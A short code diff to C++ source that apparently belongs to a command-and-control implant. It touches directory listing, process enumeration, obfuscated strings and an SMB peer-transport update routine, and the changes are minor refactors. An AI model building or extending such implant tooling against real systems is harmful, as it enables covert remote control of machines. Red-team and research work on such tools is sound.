@@ -1,5 +1,4 @@
 #include <core/include/commands.hpp>
-#include <core/dotnet.hpp>
 namespace Commands {
 
     VOID DirectoryList (_parser *const parser) {
@@ -142,7 +141,7 @@ namespace Commands {
         HEXANE
 
         _stream *out = Stream::CreateStreamWithHeaders(TypeResponse);
-        Stream::PackString(out, OBF("ProcessList"));
+        Stream::PackDword(out, PROCESSLIST);
 
         PROCESSENTRY32 entries      = { };
         HANDLE snapshot             = { };
@@ -225,8 +224,9 @@ namespace Commands {
     }
 
     VOID UpdatePeer(_parser *parser) {
-        HEXANE
+        HEXANE;
 
+	// todo : refactor everything here
         auto name_length = x_wcslen(Ctx->transport.smb->ingress_name) * sizeof(WCHAR);
 
         if (Ctx->transport.smb->ingress_name) {
